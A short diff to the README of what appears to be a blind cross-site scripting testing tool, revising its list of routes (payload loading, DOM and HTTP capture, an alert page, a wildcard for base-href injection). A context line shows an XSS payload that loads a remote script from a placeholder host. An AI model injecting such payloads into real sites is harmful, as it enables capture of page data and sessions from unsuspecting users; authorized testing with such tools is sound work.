@@ -126,13 +126,15 @@ Once the application is functional, you would just identify sites you are author
 "><script src="https://example.com/m"></script>
 ```
 
-The application has five core functions to utilize:
+The application has the following routes:
 
 - POST - /m (Captures DOM information)
 - GET - /m (Loads the payload)
 - GET - /mH (Captures HTTP interactions)
+- GET - /alert (displays alert(1))
 - Payloads - /payloads (Gives payloads you can use for testing blind xss)
-- Everything else - Loads alert(1)
+- * - (Wildcard for <base href> injection
+
 
 # Contribute?
 
